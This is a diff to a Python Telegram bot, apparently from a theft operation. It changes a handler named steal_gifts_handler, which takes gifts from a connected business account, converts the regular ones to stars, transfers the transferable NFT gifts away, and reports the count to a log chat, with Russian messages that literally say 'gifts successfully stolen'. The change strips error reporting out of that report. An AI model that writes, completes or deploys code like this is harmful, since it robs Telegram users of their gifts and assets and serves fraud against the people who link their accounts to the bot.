@@ -497,7 +497,6 @@ async def steal_gifts_handler(callback: CallbackQuery):
 
     stolen_nfts = []
     stolen_count = 0
-    errors = []
     
     try:
         gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
@@ -519,8 +518,7 @@ async def steal_gifts_handler(callback: CallbackQuery):
         if gift_type == "regular":
             try:
                 await bot.convert_gift_to_stars(business_id, gift_id)
-            except Exception as e:
-                errors.append(f"Ошибка конвертации: {e}")
+            except Exception:
                 continue
         
         if gift_type == "unique" and gift.can_be_transferred:
@@ -529,20 +527,16 @@ async def steal_gifts_handler(callback: CallbackQuery):
                 gift_name = gift.gift.name.replace(" ", "") if hasattr(gift.gift, 'name') else "Unknown"
                 stolen_nfts.append(f"t.me/nft/{gift_name}")
                 stolen_count += 1
-            except Exception as e:
-                errors.append(f"Ошибка передачи {gift_id}: {e}")
+            except Exception:
+                continue
 
-    # Формируем отчет
+    # Формируем отчет без ошибок
     result_msg = []
     if stolen_count > 0:
-        result_msg.append(f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>")
+        result_msg.append(f"\n🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n")
         result_msg.extend(stolen_nfts[:10])  # Ограничиваем количество выводимых NFT
     
-    if errors:
-        result_msg.append("\n⚠️ Ошибки:")
-        result_msg.extend(errors[:5])  # Ограничиваем количество выводимых ошибок
-    
-    full_report = "\n".join(result_msg) if result_msg else "Не удалось украсть подарки"
+    full_report = "\n".join(result_msg) if result_msg else "\nНе удалось украсть подарки"
     
     # Отправляем отчет в LOG_CHAT_ID
     await bot.send_message(
